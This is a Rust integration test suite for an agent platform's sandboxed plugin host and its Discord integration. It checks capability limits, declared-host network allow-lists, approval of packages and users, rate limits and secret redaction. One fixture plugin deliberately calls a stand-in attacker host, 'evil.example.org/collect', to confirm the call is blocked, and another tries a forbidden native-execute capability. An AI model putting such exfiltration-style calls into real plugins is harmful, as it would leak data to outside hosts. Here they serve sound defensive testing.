mod common;

use axum::{
    Json, Router,
    body::Body,
    extract::State,
    http::{HeaderMap, StatusCode},
    response::IntoResponse,
};
use cairn_installation::{
    config::{MAIN_AGENT_ID, now},
    plugins::{
        capabilities,
        connections::{self, Connection},
        discord, registry, runtime, work,
    },
    service::Service,
    validation::text,
};
use cairn_plugin_api::Manifest;
use cairn_plugin_host::{Denied, Host, Session};
use serde_json::{Value, json};
use std::{
    path::PathBuf,
    sync::{
        Arc,
        atomic::{AtomicUsize, Ordering},
    },
    time::Duration,
};
use tempfile::TempDir;
use tokio::sync::Mutex;

fn worker() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_cairn"))
}

async fn service() -> (TempDir, Arc<Service>, Value) {
    let root = TempDir::new().unwrap();
    std::fs::create_dir_all(root.path().join("home")).unwrap();
    let mut config = common::config(root.path());
    config.runner_url = "http://runner:4311".into();
    let s = Service::new(config).await.unwrap();
    common::relay_fixture::claimed(&s).await.unwrap();
    s.plugins.use_worker(worker());
    let agent = s
        .agent(
            json!({
                "name": "Discord agent",
                "access": { "projects": [], "skills": [], "mcps": [], "github": false, "installation": false },
            }),
            None,
        )
        .await
        .unwrap();
    (root, s, agent)
}

async fn fixture() -> (TempDir, Arc<Service>, Connection) {
    let (root, s, agent) = service().await;
    let connection = connections::save(
        &s,
        "discord",
        &json!({
            "name": "Test Discord",
            "settings": { "guildId": "100", "channelId": "200", "botName": "Cairn" },
            "userIds": ["300"],
            "agentId": agent["id"],
            "projectId": null,
            "maxMessagesPerHour": 2,
            "enabled": true,
            "token": "synthetic_discord_token",
        }),
        None,
    )
    .await
    .unwrap();
    (root, s, serde_json::from_value(connection).unwrap())
}

fn message(id: &str, author: &str, content: &str) -> Value {
    json!({
        "id": id,
        "guild_id": "100",
        "channel_id": "200",
        "content": content,
        "author": { "id": author, "username": "sarah", "global_name": "Sarah", "bot": false },
        "mentions": [{ "id": "400" }],
    })
}

async fn accept(
    s: &Service,
    connection: &Connection,
    value: Value,
) -> cairn_installation::error::Result<bool> {
    match discord::inbound(connection, "400", &std::collections::HashSet::new(), &value) {
        Some(inbound) => work::accept(s, connection, inbound).await,
        None => Ok(false),
    }
}

/// What a handler acts for: here, the Discord package handling `event`.
fn context(connection: &Connection, event: &Value) -> capabilities::Context {
    capabilities::Context {
        connection: connection.clone(),
        manifest: registry::builtin("discord").unwrap().manifest,
        event: event.clone(),
    }
}

async fn session(s: &Service, plugin: &str) -> Session {
    let package = registry::active(s, plugin).await.unwrap();
    s.plugins
        .host
        .start(&worker(), &package.manifest, &package.source)
        .await
        .unwrap()
}

/// A fake Discord (and status API): records every call and answers like the real one.
#[derive(Default)]
struct Mock {
    requests: Mutex<Vec<Call>>,
    /// Statuses for the next message posts, consumed first to last.
    statuses: Mutex<Vec<u16>>,
}

struct Call {
    method: String,
    path: String,
    headers: HeaderMap,
    body: Value,
}

impl Mock {
    async fn posts(&self, path: &str) -> Vec<Value> {
        self.requests
            .lock()
            .await
            .iter()
            .filter(|call| call.method == "POST" && call.path == path)
            .map(|call| call.body.clone())
            .collect()
    }

    async fn called(&self, method: &str, prefix: &str) -> usize {
        self.requests
            .lock()
            .await
            .iter()
            .filter(|call| call.method == method && call.path.starts_with(prefix))
            .count()
    }
}

const PNG: &[u8] = b"\x89PNG\r\n\x1a\nsynthetic";

async fn record(
    State(mock): State<Arc<Mock>>,
    method: axum::http::Method,
    uri: axum::http::Uri,
    headers: HeaderMap,
    body: axum::body::Bytes,
) -> axum::response::Response {
    let path = uri.path().to_owned();
    let parsed = serde_json::from_slice(&body)
        .unwrap_or_else(|_| Value::String(String::from_utf8_lossy(&body).into_owned()));
    let posting = method == "POST" && path.ends_with("/messages");
    mock.requests.lock().await.push(Call {
        method: method.to_string(),
        path: path.clone(),
        headers,
        body: parsed,
    });
    if posting {
        let mut statuses = mock.statuses.lock().await;
        if !statuses.is_empty() && statuses.remove(0) == 429 {
            return (
                StatusCode::TOO_MANY_REQUESTS,
                Json(json!({ "retry_after": 1 })),
            )
                .into_response();
        }
        let count = mock.requests.lock().await.len();
        return Json(json!({ "id": format!("{}", 9000 + count) })).into_response();
    }
    if path.ends_with("/threads") {
        return Json(json!({ "id": "700" })).into_response();
    }
    if path.starts_with("/attachments/") {
        return PNG.into_response();
    }
    if path == "/v1/redirect" {
        return (
            StatusCode::FOUND,
            [("location", "http://127.0.0.1:9/elsewhere")],
        )
            .into_response();
    }
    Json(json!({ "id": "600" })).into_response()
}

async fn mock(s: &Service) -> (Arc<Mock>, tokio::task::JoinHandle<()>) {
    let mock = Arc::new(Mock::default());
    let app = Router::new().fallback(record).with_state(mock.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    s.plugins
        .route_http_to(Some(format!("http://{}", listener.local_addr().unwrap())));
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (mock, server)
}

#[tokio::test]
async fn worker_sessions_enforce_capabilities_deadlines_and_keep_state() {
    let host = Host::default();
    let onepassword = registry::builtin("onepassword").unwrap();
    let value = host
        .invoke(
            &worker(),
            &onepassword.manifest,
            &onepassword.source,
            json!({ "operation": "read" }),
            |method, input| async move {
                assert_eq!(method, "onepassword.read");
                assert_eq!(input["operation"], "read");
                Ok(json!({ "value": "synthetic_secret" }))
            },
        )
        .await
        .unwrap();
    assert_eq!(value["value"], "synthetic_secret");

    let calls = AtomicUsize::new(0);
    let error = host
        .invoke(
            &worker(),
            &onepassword.manifest,
            "return { command = function(input) return cairn.call('native.execute', input) end }",
            Value::Null,
            |_, _| {
                calls.fetch_add(1, Ordering::SeqCst);
                async { Ok(Value::Null) }
            },
        )
        .await
        .unwrap_err();
    assert_eq!(calls.load(Ordering::SeqCst), 0);
    assert!(error.contains("capability"));
    let error = host
        .invoke(
            &worker(),
            &onepassword.manifest,
            "return { command = function(input) error(input.secret) end }",
            json!({ "secret": "synthetic_secret" }),
            |_, _| async { unreachable!() },
        )
        .await
        .unwrap_err();
    assert!(!error.contains("synthetic_secret"));
    let mut incompatible = onepassword.manifest.clone();
    incompatible.api_version += 1;
    assert!(
        host.start(&worker(), &incompatible, &onepassword.source)
            .await
            .is_err()
    );

    let manifest: Manifest = serde_json::from_value(json!({
        "id": "probe", "name": "Probe", "version": "1", "apiVersion": 1, "capabilities": ["storage"]
    }))
    .unwrap();
    let mut session = host
        .start(
            &worker(),
            &manifest,
            "local count = 0 return { tick = function() count += 1 return count end, ask = function() local ok, code = pcall(cairn.storage.get, 'x') return tostring(code) end }",
        )
        .await
        .unwrap();
    for expected in [1, 2] {
        let value = session
            .dispatch("tick", Value::Null, |_, _| async { unreachable!() })
            .await
            .unwrap();
        assert_eq!(value, expected);
    }
    let value = session
        .dispatch("ask", Value::Null, |_, _| async {
            Err(Denied("forbidden"))
        })
        .await
        .unwrap();
    assert!(value.as_str().unwrap().contains("forbidden"));
    assert!(session.alive());
    session.stop().await;

    // A stuck handler ends its worker and releases the slot, even if it catches interrupts.
    let host = Host::with_limits(1, Duration::from_millis(300));
    let mut stuck = host
        .start(
            &worker(),
            &manifest,
            "return { spin = function() while true do pcall(function() while true do end end) end end }",
        )
        .await
        .unwrap();
    let started = std::time::Instant::now();
    // Either the worker's interrupt or the host's deadline ends it, never the script.
    let error = stuck
        .dispatch("spin", Value::Null, |_, _| async { unreachable!() })
        .await
        .unwrap_err();
    assert!(
        error.contains("deadline") || error.contains("failed"),
        "{error}"
    );
    assert!(started.elapsed() < Duration::from_secs(2));
    stuck.stop().await;
    let mut next = host
        .start(
            &worker(),
            &manifest,
            "return { ok = function() return true end }",
        )
        .await
        .unwrap();
    assert_eq!(
        next.dispatch("ok", Value::Null, |_, _| async { unreachable!() })
            .await
            .unwrap(),
        true
    );
    next.stop().await;
}

/// Moves the delivery's next attempt and progress throttle to now.
async fn due(s: &Service) {
    for mut delivery in s.store.list(work::DELIVERIES).await.unwrap() {
        delivery["nextAttemptAt"] = json!(now());
        delivery["progressAt"] = json!(0);
        s.store.put(work::DELIVERIES, delivery).await.unwrap();
    }
}

#[tokio::test]
async fn discord_script_runs_a_conversation_in_a_thread_end_to_end() {
    let (root, s, connection) = fixture().await;
    let (mock, server) = mock(&s).await;
    let mut session = session(&s, "discord").await;
    for (id, content) in [("498", "<@400>   "), ("499", "no mention")] {
        let mut value = message(id, "300", content);
        if id == "499" {
            value["mentions"] = json!([]);
        }
        accept(&s, &connection, value).await.unwrap();
    }
    let mut request = message(
        "500",
        "300",
        "<@400> Fix the flaky deploy\nIt fails on main",
    );
    request["attachments"] = json!([{ "url": "https://cdn.discordapp.com/attachments/1/2/shot.png", "filename": "shot.png", "size": 17 }]);
    assert!(accept(&s, &connection, request.clone()).await.unwrap());
    // Replays from the Gateway deduplicate.
    assert!(!accept(&s, &connection, request).await.unwrap());
    runtime::pump(&s, &connection, &mut session).await.unwrap();

    // 👀 on receipt, then a thread named after the request.
    assert_eq!(
        mock.called(
            "PUT",
            "/api/v10/channels/200/messages/500/reactions/%F0%9F%91%80/@me"
        )
        .await,
        1
    );
    let thread = mock
        .posts("/api/v10/channels/200/messages/500/threads")
        .await;
    assert_eq!(
        thread,
        vec![json!({ "name": "Fix the flaky deploy", "auto_archive_duration": 1440 })]
    );
    let deliveries = s.store.list(work::DELIVERIES).await.unwrap();
    assert_eq!(deliveries.len(), 1, "the empty mention starts nothing");
    let delivery = deliveries[0].clone();
    assert_eq!(
        delivery["reply"],
        json!({ "channel": "700", "source": "200", "message": "500", "threaded": true })
    );
    let chat = text(&delivery, "chatId").to_owned();
    let prefix = format!("chat-attachment:{chat}:");
    let stored = s.store.read(move |db| db.keys(&prefix)).await.unwrap();
    assert_eq!(
        stored.len(),
        1,
        "the screenshot is attached to the conversation"
    );
    assert_eq!(stored[0].1["mediaType"], "image/png");

    // While the agent works: typing, a status message with Stop, then the question.
    s.chat_tick(&std::collections::HashSet::new())
        .await
        .unwrap();
    let run_id = text(&s.get("chats", &chat).await.unwrap(), "runId").to_owned();
    s.store
        .event(
            &run_id,
            "chat.user",
            "",
            Some(json!({ "messageId": delivery["id"] })),
        )
        .await
        .unwrap();
    s.store
        .event(&run_id, "item.started", "", Some(json!({ "item": { "type": "command_execution", "command": "pnpm   test --filter deploy" } })))
        .await
        .unwrap();
    let question = "a".repeat(64);
    s.question_receive(
        &run_id,
        json!({
            "id": question,
            "blocking": true,
            "fields": [{ "id": "0", "title": "Retry the deploy?", "secret": false, "options": [
                { "label": "Yes", "description": "" }, { "label": "No", "description": "Leave it" }
            ] }],
        }),
    )
    .await
    .unwrap();
    due(&s).await;
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert!(mock.called("POST", "/api/v10/channels/700/typing").await >= 1);
    let posts = mock.posts("/api/v10/channels/700/messages").await;
    let status = posts
        .iter()
        .find(|post| text(post, "content").starts_with('⏳'))
        .unwrap();
    assert_eq!(status["content"], "⏳ Running `pnpm test --filter deploy`");
    assert_eq!(
        status["components"][0]["components"][0]["custom_id"],
        "stop"
    );
    let asked = posts
        .iter()
        .find(|post| text(post, "content").contains("Retry the deploy?"))
        .unwrap();
    let buttons = &asked["components"][0]["components"];
    assert_eq!(buttons[1]["label"], "No");
    let custom = text(&buttons[1], "custom_id").to_owned();

    // A button press is acknowledged by the transport and answers the agent.
    let mut threads = std::collections::HashSet::new();
    threads.insert("700".to_owned());
    let click = json!({
        "id": "800", "token": "synthetic_interaction", "type": 3, "guild_id": "100", "channel_id": "700",
        "member": { "user": { "id": "300", "username": "sarah" } },
        "message": { "id": "9002", "author": { "id": "400" } },
        "data": { "custom_id": custom },
    });
    discord::interact(&s, &connection, "400", &threads, &click)
        .await
        .unwrap();
    assert_eq!(
        mock.called(
            "POST",
            "/api/v10/interactions/800/synthetic_interaction/callback"
        )
        .await,
        1
    );
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    let pending = s
        .store
        .kv(&format!("chat-question:{chat}:{question}"))
        .await
        .unwrap()
        .unwrap();
    assert_eq!(pending["status"], "answering");
    assert!(
        mock.called("PATCH", "/api/v10/channels/700/messages/")
            .await
            >= 1
    );

    // The final answer arrives in the thread with the turn's deliverable attached.
    let artifact = cairn_installation::config::id();
    std::fs::create_dir_all(root.path().join("data/artifacts")).unwrap();
    std::fs::write(
        root.path().join(format!("data/artifacts/{artifact}")),
        "report body",
    )
    .unwrap();
    s.store
        .event(&run_id, "artifact", "Report", Some(json!({ "id": artifact, "name": "report.md", "mediaType": "text/markdown", "size": 11 })))
        .await
        .unwrap();
    let answer = format!("{}{}", "é".repeat(1900), "done");
    s.store
        .event(
            &run_id,
            "item.completed",
            &answer,
            Some(json!({ "item": { "type": "agent_message", "text": answer } })),
        )
        .await
        .unwrap();
    s.store
        .event(&run_id, "turn.completed", "", None)
        .await
        .unwrap();
    mock.statuses.lock().await.push(429);
    due(&s).await;
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert_eq!(
        s.store.list(work::DELIVERIES).await.unwrap().len(),
        1,
        "rate limited, retried later"
    );
    due(&s).await;
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert!(s.store.list(work::DELIVERIES).await.unwrap().is_empty());
    assert_eq!(
        s.store.list("plugin-activity").await.unwrap()[0]["status"],
        "replied"
    );

    let posts = mock.posts("/api/v10/channels/700/messages").await;
    let replies = &posts[posts.len() - 3..];
    assert_eq!(
        replies[0]["nonce"], replies[1]["nonce"],
        "the retry reuses its nonce"
    );
    assert!(
        replies[1]["message_reference"].is_null(),
        "threads need no reference"
    );
    assert_eq!(replies[1]["allowed_mentions"]["parse"], json!([]));
    let upload = replies[2].as_str().unwrap();
    assert!(
        upload.contains("filename=\"report.md\"")
            && upload.contains("report body")
            && upload.contains("\"content\":\"done\"")
    );
    let calls = mock.requests.lock().await;
    let multipart = calls
        .iter()
        .find(|call| {
            call.body
                .as_str()
                .is_some_and(|body| body.contains("report body"))
        })
        .unwrap();
    assert!(
        multipart.headers["content-type"]
            .to_str()
            .unwrap()
            .starts_with("multipart/form-data; boundary=")
    );
    assert!(calls.iter().all(|call| {
        call.path.starts_with("/attachments/")
            || call.path.contains("/interactions/")
            || call
                .headers
                .get("authorization")
                .is_some_and(|value| value == "Bot synthetic_discord_token")
    }));
    drop(calls);
    assert_eq!(
        mock.called("DELETE", "/api/v10/channels/700/messages/")
            .await,
        1,
        "the status message is removed"
    );
    assert_eq!(
        mock.called(
            "PUT",
            "/api/v10/channels/200/messages/500/reactions/%E2%9C%85/@me"
        )
        .await,
        1
    );

    // "stop" in the thread cancels the agent's work on the next request.
    let mut follow = message("501", "300", "<@400> also check staging");
    follow["channel_id"] = json!("700");
    assert!(
        work::accept(
            &s,
            &connection,
            discord::inbound(&connection, "400", &threads, &follow).unwrap()
        )
        .await
        .unwrap()
    );
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert_eq!(
        s.store.list(work::DELIVERIES).await.unwrap()[0]["chatId"],
        chat,
        "same thread, same conversation"
    );
    let mut stop = message("502", "300", "<@400> stop");
    stop["channel_id"] = json!("700");
    work::accept(
        &s,
        &connection,
        discord::inbound(&connection, "400", &threads, &stop).unwrap(),
    )
    .await
    .unwrap();
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert_eq!(s.get("chats", &chat).await.unwrap()["paused"], true);
    assert_eq!(
        mock.called(
            "PUT",
            "/api/v10/channels/700/messages/502/reactions/%E2%8F%B9%EF%B8%8F/@me"
        )
        .await,
        1
    );
    session.stop().await;
    server.abort();
}

#[tokio::test]
async fn access_requests_wait_for_approval_without_storing_content() {
    let (_root, s, connection) = fixture().await;
    let (mock, server) = mock(&s).await;
    let saved = connections::save(
        &s,
        "discord",
        &json!({
            "name": "#support on Acme",
            "settings": { "guildId": "100", "channelId": "200" },
            "accessMode": "requests",
            "userIds": [],
            "agentId": connection.agent_id,
            "projectId": null,
            "enabled": true,
        }),
        Some(&connection.id),
    )
    .await
    .unwrap();
    let connection: Connection = serde_json::from_value(saved).unwrap();
    let mut session = session(&s, "discord").await;
    for id in ["600", "601"] {
        assert!(
            !accept(
                &s,
                &connection,
                message(id, "301", "<@400> private question")
            )
            .await
            .unwrap()
        );
    }
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert!(
        !accept(
            &s,
            &connection,
            message("602", "301", "<@400> private question")
        )
        .await
        .unwrap()
    );
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    let requests = s.store.list("plugin-requests").await.unwrap();
    assert_eq!(requests.len(), 1);
    assert_eq!(requests[0]["name"], "Sarah");
    assert_eq!(requests[0]["mentions"], 3);
    // The script answered once, and nothing the person wrote was kept anywhere.
    assert_eq!(mock.requests.lock().await.len(), 1);
    assert!(text(&mock.requests.lock().await[0].body, "content").contains("approve"));
    for kind in [
        "plugin-requests",
        "plugin-events",
        "plugin-storage",
        "plugin-activity",
    ] {
        let stored = serde_json::to_string(&s.store.list(kind).await.unwrap()).unwrap();
        assert!(!stored.contains("private question"), "{kind}");
    }

    // Approval applies to the running worker without a new revision.
    connections::people(&s, "discord", &connection.id, "301", "approve")
        .await
        .unwrap();
    assert!(
        accept(&s, &connection, message("603", "301", "<@400> now allowed"))
            .await
            .unwrap()
    );
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert_eq!(s.store.list(work::DELIVERIES).await.unwrap().len(), 1);

    assert!(
        !accept(&s, &connection, message("610", "302", "<@400> hi"))
            .await
            .unwrap()
    );
    connections::people(&s, "discord", &connection.id, "302", "deny")
        .await
        .unwrap();
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    let notices = mock.requests.lock().await.len();
    assert!(
        !accept(&s, &connection, message("611", "302", "<@400> hi"))
            .await
            .unwrap()
    );
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    assert_eq!(
        mock.requests.lock().await.len(),
        notices,
        "denied people stay silent"
    );

    let overview = connections::overview(&s).await.unwrap();
    assert_eq!(overview[0]["userIds"], json!(["301"]));
    assert_eq!(
        overview[0]["people"],
        json!([{ "id": "301", "name": "Sarah" }])
    );
    assert_eq!(overview[0]["requests"], json!([]));
    assert_eq!(overview[0]["usage"]["hour"], 1);
    assert_eq!(overview[0]["activity"][0]["name"], "Sarah");

    connections::people(&s, "discord", &connection.id, "301", "remove")
        .await
        .unwrap();
    connections::set_enabled(&s, "discord", &connection.id, &json!({ "enabled": false }))
        .await
        .unwrap();
    assert_eq!(
        accept(&s, &connection, message("605", "301", "<@400> hi"))
            .await
            .unwrap_err()
            .status,
        403
    );
    connections::remove(&s, "discord", &connection.id)
        .await
        .unwrap();
    for kind in connections::OWNED {
        assert!(s.store.list(kind).await.unwrap().is_empty(), "{kind}");
    }
    session.stop().await;
    server.abort();
}

#[tokio::test]
async fn rate_limits_and_changed_agent_access_stop_admission() {
    let (_root, s, connection) = fixture().await;
    let event = |id: &str| {
        json!({
            "name": "message",
            "revision": connection.revision,
            "authorId": "300",
            "payload": { "id": id, "author": { "id": "300", "name": "Sarah" } },
        })
    };
    for id in ["500", "501"] {
        work::submit(
            &s,
            &context(&connection, &event(id)),
            &json!({ "text": "hello" }),
        )
        .await
        .unwrap();
    }
    assert_eq!(
        work::submit(
            &s,
            &context(&connection, &event("502")),
            &json!({ "text": "too many" })
        )
        .await
        .unwrap_err()
        .status,
        429
    );
    // Scripts can't act for someone else or outside a message.
    let mut stranger = event("503");
    stranger["authorId"] = json!("999");
    assert_eq!(
        work::submit(
            &s,
            &context(&connection, &stranger),
            &json!({ "text": "x" })
        )
        .await
        .unwrap_err()
        .status,
        403
    );
    let mut timer = event("504");
    timer["name"] = json!("timer");
    assert_eq!(
        work::submit(&s, &context(&connection, &timer), &json!({ "text": "x" }))
            .await
            .unwrap_err()
            .status,
        403
    );

    let mut agent = s.get("agents", &connection.agent_id).await.unwrap();
    agent["access"]["projects"] = Value::Null;
    s.agent(agent, Some(&connection.agent_id)).await.unwrap();
    assert_eq!(
        accept(&s, &connection, message("505", "300", "<@400> hi"))
            .await
            .unwrap_err()
            .status,
        403
    );
    let broad = connections::save(
        &s,
        "discord",
        &json!({
            "name": "Broad",
            "settings": { "guildId": "100", "channelId": "200" },
            "userIds": ["300"],
            "agentId": MAIN_AGENT_ID,
            "enabled": true,
            "token": "synthetic_discord_token",
        }),
        None,
    )
    .await;
    assert!(broad.is_err());
    for settings in [
        json!({ "guildId": "100" }),
        json!({ "guildId": "100", "channelId": "x" }),
        json!({ "guildId": "100", "channelId": "200", "extra": 1 }),
    ] {
        let result = connections::save(
            &s,
            "discord",
            &json!({ "name": "Bad", "settings": settings, "userIds": ["300"], "agentId": connection.agent_id, "enabled": false, "token": "t" }),
            None,
        )
        .await;
        assert!(result.is_err());
    }
}

#[tokio::test]
async fn replies_export_only_the_correlated_completed_turn_and_revoke_immediately() {
    let (_root, s, connection) = fixture().await;
    let event = json!({
        "name": "message",
        "revision": connection.revision,
        "authorId": "300",
        "payload": { "id": "500", "author": { "id": "300", "name": "Sarah" } },
    });
    let receipt = work::submit(
        &s,
        &context(&connection, &event),
        &json!({ "text": "hello" }),
    )
    .await
    .unwrap();
    s.chat_tick(&std::collections::HashSet::new())
        .await
        .unwrap();
    let chat = s.get("chats", text(&receipt, "chatId")).await.unwrap();
    let run_id = text(&chat, "runId");
    let agent = |text: &str| Some(json!({ "item": { "type": "agent_message", "text": text } }));
    s.store
        .event(
            run_id,
            "item.completed",
            "unrelated answer",
            agent("unrelated answer"),
        )
        .await
        .unwrap();
    s.store
        .event(run_id, "turn.completed", "", None)
        .await
        .unwrap();
    let delivery = s.store.list(work::DELIVERIES).await.unwrap().remove(0);
    assert!(
        work::reply(&s, &connection, &delivery)
            .await
            .unwrap()
            .is_none()
    );
    s.store
        .event(
            run_id,
            "chat.user",
            "hello",
            Some(json!({ "messageId": receipt["messageId"] })),
        )
        .await
        .unwrap();
    s.store
        .event(
            run_id,
            "item.completed",
            "synthetic_secret",
            Some(json!({ "item": { "type": "command_execution", "aggregated_output": "synthetic_secret" } })),
        )
        .await
        .unwrap();
    s.store
        .event(run_id, "item.completed", "hello back", agent("hello back"))
        .await
        .unwrap();
    assert!(
        work::reply(&s, &connection, &delivery)
            .await
            .unwrap()
            .is_none()
    );
    s.store
        .event(run_id, "turn.completed", "", None)
        .await
        .unwrap();
    let reply = work::reply(&s, &connection, &delivery)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        (reply.text.as_str(), reply.status),
        ("hello back", "completed")
    );
    connections::remove(&s, "discord", &connection.id)
        .await
        .unwrap();
    assert_eq!(
        work::reply(&s, &connection, &delivery)
            .await
            .unwrap_err()
            .status,
        403
    );
    assert!(s.store.list(work::DELIVERIES).await.unwrap().is_empty());
    assert!(s.get("chats", text(&receipt, "chatId")).await.is_ok());
}

fn pinger(version: &str, capabilities: &[&str]) -> Value {
    json!({
        "manifest": {
            "id": "pinger",
            "name": "Pinger",
            "version": version,
            "description": "Pings a status API.",
            "apiVersion": 1,
            "capabilities": capabilities,
            "hosts": ["api.example.com"],
            "credential": { "label": "API key", "header": "x-api-key" },
            "settings": [{ "key": "team", "title": "Team", "type": "string", "required": true }],
        },
        "source": r#"return {
            start = function(event)
                cairn.timers.after(60, "ping", { team = "core" })
            end,
            timer = function(event)
                local response = cairn.http.request({ method = "POST", url = "https://api.example.com/v1/ping", json = event.payload, auth = true })
                cairn.storage.set("status", response.status)
                local ok, code = pcall(cairn.http.request, { url = "https://evil.example.org/collect" })
                cairn.storage.set("blocked", tostring(code))
                cairn.storage.set("redirect", cairn.http.request({ url = "https://api.example.com/v1/redirect" }).status)
            end,
        }"#,
    })
}

#[tokio::test]
async fn installed_packages_need_approval_and_reach_only_declared_hosts() {
    let (root, s, _) = service().await;
    let (mock, server) = mock(&s).await;
    for invalid in [
        json!({ "manifest": pinger("1.0.0", &["onepassword.read"])["manifest"], "source": "return {}" }),
        json!({ "manifest": { "id": "discord", "name": "Fake", "version": "1", "apiVersion": 1, "capabilities": [] }, "source": "return {}" }),
        json!({ "manifest": { "id": "broken", "name": "Broken", "version": "1", "apiVersion": 1, "capabilities": [] }, "source": "return function() end" }),
    ] {
        assert!(registry::install(&s, &invalid).await.is_err());
    }
    let package = pinger("1.0.0", &["timers", "storage", "http"]);
    registry::install(&s, &package).await.unwrap();
    let catalog = registry::catalog(&s).await.unwrap();
    let entry = catalog["packages"]
        .as_array()
        .unwrap()
        .iter()
        .find(|item| item["id"] == "pinger")
        .unwrap()
        .clone();
    assert_eq!(entry["status"], "needs_approval");
    let input = json!({ "name": "Core status", "settings": { "team": "core" }, "token": "secret-key", "enabled": true });
    assert_eq!(
        connections::save(&s, "pinger", &input, None)
            .await
            .unwrap_err()
            .status,
        403
    );

    registry::approve(&s, "pinger", "1.0.0").await.unwrap();
    for bad in [json!({ "team": "core", "other": 1 }), json!({})] {
        let mut input = input.clone();
        input["settings"] = bad;
        assert!(connections::save(&s, "pinger", &input, None).await.is_err());
    }
    let connection: Connection =
        serde_json::from_value(connections::save(&s, "pinger", &input, None).await.unwrap())
            .unwrap();
    assert!(
        connection.agent_id.is_empty(),
        "plugins without conversations get no agent"
    );

    let mut session = session(&s, "pinger").await;
    runtime::begin(&s, &connection, &mut session).await.unwrap();
    let mut timer = s.store.list("plugin-timers").await.unwrap().remove(0);
    assert!(timer["at"].as_i64().unwrap() > now() + 50_000);
    timer["at"] = json!(now());
    s.store.put("plugin-timers", timer).await.unwrap();
    runtime::pump(&s, &connection, &mut session).await.unwrap();
    let requests = mock.requests.lock().await;
    assert_eq!(requests.len(), 2, "the undeclared host was never contacted");
    assert_eq!(requests[0].path, "/v1/ping");
    assert_eq!(requests[0].headers["x-api-key"], "secret-key");
    assert_eq!(requests[0].body, json!({ "team": "core" }));
    assert!(requests[1].headers.get("x-api-key").is_none());
    drop(requests);
    let stored = s.store.list("plugin-storage").await.unwrap();
    let value = |key: &str| stored.iter().find(|item| item["key"] == key).unwrap()["value"].clone();
    assert_eq!(value("status"), 200);
    assert!(value("blocked").as_str().unwrap().contains("forbidden"));
    assert_eq!(
        value("redirect"),
        302,
        "redirects are returned, never followed"
    );
    session.stop().await;

    // Editing an approved package on disk withdraws it until it is approved again.
    let source = root.path().join("data/plugins/pinger/1.0.0/main.luau");
    let original = std::fs::read_to_string(&source).unwrap();
    std::fs::write(&source, "return { start = function() end }").unwrap();
    assert_eq!(
        registry::active(&s, "pinger").await.err().unwrap().status,
        403
    );
    std::fs::write(&source, &original).unwrap();
    assert!(registry::active(&s, "pinger").await.is_ok());

    // A new version waits for approval; the owner can roll back afterwards.
    registry::install(
        &s,
        &pinger(
            "1.1.0",
            &["timers", "storage", "http", "conversations.submit"],
        ),
    )
    .await
    .unwrap();
    let catalog = registry::catalog(&s).await.unwrap();
    let entry = catalog["packages"]
        .as_array()
        .unwrap()
        .iter()
        .find(|item| item["id"] == "pinger")
        .unwrap()
        .clone();
    assert_eq!(entry["status"], "update");
    assert_eq!(entry["active"], "1.0.0");
    assert!(registry::activate(&s, "pinger", "1.1.0").await.is_err());
    registry::approve(&s, "pinger", "1.1.0").await.unwrap();
    assert_eq!(
        registry::active(&s, "pinger")
            .await
            .unwrap()
            .manifest
            .version,
        "1.1.0"
    );
    registry::activate(&s, "pinger", "1.0.0").await.unwrap();
    assert_eq!(
        registry::active(&s, "pinger")
            .await
            .unwrap()
            .manifest
            .version,
        "1.0.0"
    );

    assert_eq!(
        registry::uninstall(&s, "pinger").await.unwrap_err().status,
        409
    );
    connections::remove(&s, "pinger", &connection.id)
        .await
        .unwrap();
    registry::uninstall(&s, "pinger").await.unwrap();
    assert!(!root.path().join("data/plugins/pinger").exists());
    assert!(registry::uninstall(&s, "discord").await.is_err());
    server.abort();
}

#[tokio::test]
async fn plugin_management_is_owner_only_and_mcp_never_returns_secret_reads() {
    let (_root, s, _connection) = fixture().await;
    let app = cairn_installation::http::router(s.clone()).await.unwrap();
    let response = common::send(
        &app,
        common::request("GET", "/api/plugins")
            .extension(cairn_installation::auth::InstallationIdentity::trusted(
                cairn_installation::auth::InstallationRole::Member,
                "member",
            ))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(response.status(), StatusCode::FORBIDDEN);
    let task = s
        .task(
            json!({ "name": "Inspect", "agentId": MAIN_AGENT_ID, "prompt": "Inspect" }),
            None,
        )
        .await
        .unwrap();
    let run = s.enqueue(text(&task, "id"), "manual", None).await.unwrap();
    let run = s
        .store
        .patch_run(
            text(&run, "id"),
            json!({ "status": "running", "isolated": true }),
        )
        .await
        .unwrap();
    let config = s.mcps.run_configuration(&s, &run).await.unwrap();
    let token = text(&config["env"], "CAIRN_MCP_RUN_TOKEN");
    let response = common::send(
        &app,
        common::request("POST", "/mcp-workspace")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(
                json!({
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": { "name": "onepassword", "arguments": { "operation": "read" } }
                })
                .to_string(),
            ))
            .unwrap(),
    )
    .await;
    let response = common::read_json(response).await;
    assert!(
        response["result"]["isError"] == true || response["error"].is_object(),
        "{response}"
    );
    assert!(response["result"]["structuredContent"].is_null());
    let response = common::send(
        &app,
        common::request("POST", "/plugin-command")
            .header("authorization", "Bearer invalid")
            .body(Body::from(
                json!({ "plugin": "onepassword", "arguments": { "operation": "read" } })
                    .to_string(),
            ))
            .unwrap(),
    )
    .await;
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
    let catalog = s.store.list(connections::KIND).await.unwrap();
    assert!(
        !serde_json::to_string(&catalog)
            .unwrap()
            .contains("synthetic_discord_token")
    );
}
